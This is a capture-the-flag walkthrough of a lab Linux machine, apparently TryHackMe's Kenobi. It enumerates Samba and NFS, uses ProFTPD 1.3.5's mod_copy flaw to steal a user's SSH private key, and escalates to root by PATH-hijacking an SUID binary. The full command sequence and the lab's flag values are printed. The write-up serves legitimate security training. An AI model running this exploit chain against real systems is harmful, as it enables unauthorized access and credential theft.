# Kenobi

> Walkthrough on exploiting a Linux machine. Enumerate Samba for shares, manipulate a vulnerable version of proftpd and escalate your privileges with path variable manipulation.

<br>

### Process

1. Scan machine to find open ports:
   - `nmap -T4 10.10.151.195`
   - number of ports open = **7**
2. Enumerate Samba shares
   - > Samba is the standard Windows interoperability suite of programs for Linux and Unix. It allows end users to access and use files, printers and other commonly shared resources on a companies intranet or internet. Its often referred to as a network file system.
   - > Samba is based on the common client/server protocol of Server Message Block (SMB). SMB is developed only for Windows, without Samba, other computer platforms would be isolated from Windows machines, even if they were part of the same network.
   - enumerate SMB shares with nmap:
     - `nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.151.195`
     - number of shares found = **3**
   - inspect SMB shares with Linux smbclient:
     - `smbclient //10.10.151.195/anonymous` -> [no password]
     - list files: `ls` -- files found = **log.txt**
   - recursively download the SMB file share:
     - `smbget -R smb://10.10.151.195/anonymous` -> [no password]
     - open file share: `cat log.txt` -- port FTP is running on = **21**
3. Find out where filesystems are mounted:
   - > nmap port scan showed port 111 running the service rpcbind (a server that converts remote procedure call (RPC) program number into universal addresses). When an RPC service is started, it tells rpcbind the address at which it is listening and the RPC program number its prepared to serve.
   - you can use nmap to access the network file system through this service:
     - `nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.151.195`
     - found mount = **/var**
4. Gain initial access to ProFtpd:
   - > ProFtpd is a free and open-source FTP server, compatible with Unix and Windows systems. It has also been vulnerable in the past software versions.
   - use netcat to connect to the machine on the FTP port:
     - `nc -v 10.10.151.195 21`
     - found version of ProFtpd running = **1.3.5**
   - search for possible exploits using searchsploit (a command line search tool for exploit-db.com):
     - `searchsploit proftpd 1.3.5`
     - possible exploits found = **3**
     - using [mod_copy module](http://www.proftpd.org/docs/contrib/mod_copy.html) exploit
     - > mod_copy module implements SITE CPFR and SITE CPTO commands, which can be used to copy files/directories from one place to another on the server. Any unauthenticated client can leverage these commands to copy files from any part of the filesystem to a chosen destination.
   - FTP service is running at the Kenobi user and an SSH key is generated for that user. So copy Kenobi's private key using SITE CPFR and SITE CPTO commands:
       - `nc -v 10.10.151.195 21` -> `SITE CPFR /home/kenobi/.ssh/id_rsa` -> `SITE CPTO /var/tmp/id_rsa`
       - check key exists (with SITE CPFR) and then copy it to the previously discovered mounted directory ("/var") under the "/var/tmp" directory
    - mount the "/var/tmp" directory to attack machine:
       - `mkdir /mnt/kenobiNFS` -> `mount 10.10.151.195:/var /mnt/kenobiNFS` -> `ls -la /mnt/kenobiNFS`
    - copy Kenobi account's private SSH key to home directory and use to login to the target machine:
       - `cp /mnt/kenobiNFS/tmp/id_rsa .` -> `sudo chmod 600 id_rsa` -> `ssh -i id_rsa kenobi@10.10.151.195`
       - Kenobi's user flag = **d0b0f3f53b6caa532a83915e19224899**
5. Escalate privileges with path variable manipulation:
   - > SUID bits can be dangerous, some binaries such as passwd need to be run with elevated privileges (as its resetting your password on the system), however other custom files could that have the SUID bit can lead to all sorts of issues as they are executed with teh permissions of the file owner (not current user).
   - search the system for SUID files:
     - `find / -perm -u=s -type f 2>/dev/null`
       - or could SCP a privilege escalation script to machine because you have SSH login credentials (the id_rsa identity file)
         - i.e. `scp -i id_rsa linpeas.sh kenobi@10.10.151.195:/tmp`
     - file that looks out of the ordinary = **/usr/bin/menu**
     - running the binary shows number of options = **3**
   - run `strings` against the binary:
     - `strings /usr/bin/menu`
     - found that it runs binaries without the full path (i.e. `curl` instead of `/usr/bin/curl`) and as this binary runs as root you can manipulate the path variable to gain a root shell:
       - `cd /tmp && echo /bin/sh > curl` -> `chmod 777 curl` -> `export PATH=/tmp:$PATH`
       - copy the "/bin/sh" shell into a file called "curl", give it the correct permissions, and then put its location in the path variable so that running "/usr/bin/menu" will use our "curl" binary and instead run "/bin/sh" with root privileges
   - get root shell: `/usr/bin/menu`
   - root flag = **177b3cd8562289f37382721c28381f02**
